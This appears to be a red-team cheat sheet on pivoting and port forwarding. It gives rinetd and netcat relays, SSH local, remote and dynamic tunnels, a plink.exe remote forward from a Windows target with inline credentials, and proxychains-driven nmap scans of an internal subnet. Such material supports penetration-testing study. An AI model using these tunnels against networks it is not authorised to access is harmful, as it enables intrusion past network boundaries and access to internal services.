## Pivoting & Port Forwarding

### Local Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen15.png?raw=true)

1- Rinetd
```
# Target Machine // 10.0.0.1
Python -m SimpleHTTPServer 80

# Gateway Machine
apt-get install rinetd
nano /etc/rinetd.conf
    localhost    localport    remotehost    remoteport     
    127.0.0.1    53            10.0.0.1    80

# Kali Machine // http://gatway:53 → http://10.0.0.1:80
```

2- Netcat
```
# Target Machine // 10.0.0.1
nc -lnvp 22

# Gateway Machine
mknod relaynode p
nc -lvnp 1111 0<relaynode | nc 10.0.0.1 22 1>relaynode

# Kali Machine
nc gateway 1111
```

3- SSH
```
# Target Machine // 10.0.0.1
Python -m SimpleHTTPServer 80

# Gateway Machine
nano /etc/ssh/sshd_config
    Port 53

# Kali Machine
// Now we will connect to the gateway through ssh on port 53, then we will connect
// port 8080 on the internal machine with port 80 on the web server machine. 
ssh user@gateway -p 53 -L 127.0.0.1:8080:10.0.0.1:80
// Now browse to http://127.0.0.1:8080 -> http://10.0.0.1:80
```

### Remote Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen16.png?raw=true)

1- SSH
```
# Kali Machine // 10.0.0.1
nano /etc/ssh/sshd_config
    Port 53

# Target Machine
// let’s assume that port 3389 is open internaly only.
nc -nvlp 3389
// Now we will connect to my kali machine through ssh on port 53, then we will
// connect port 4444 on kali with port 3389 on the target machine.
ssh user@10.0.0.1 -p 53 -R 10.0.0.1:4444:127.0.0.1:3389
// Now try to connect to port 4444 on kali machine.
```

2- Plink.exe
```
# kali Machine // 10.0.0.1
nano /etc/ssh/sshd_config
    Port 53

# Target Windows Machine
// let’s assume that port 3389 is open internaly only.
nc -nvlp 3389
// Now we will connect to my kali machine through ssh on port 53, then we will
// connect port 4444 on kali with port 3389 on the target windows machine.
cmd.exe /c echo y | plink.exe -ssh -l user -pw pass -P 53 -R 10.0.0.1:4444:127.0.0.1:3389 10.0.0.1
// Now try to connect to port 4444 on kali machine.
```

### Dynamic Port Forwarding

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen17.png?raw=true)

```
# Target Machine // 10.0.0.1
// SSH open on any port for example 22.

# Kali Machine
// Listen on port 9050 and any thing come to this port send it to the webserver on port 22.
ssh -D 127.0.0.1:9050 user@10.0.0.1 -p 22

nano /etc/proxychains.conf
    socks4 127.0.0.1 9050

proxychains nmap -sn 192.168.1.0/24
```
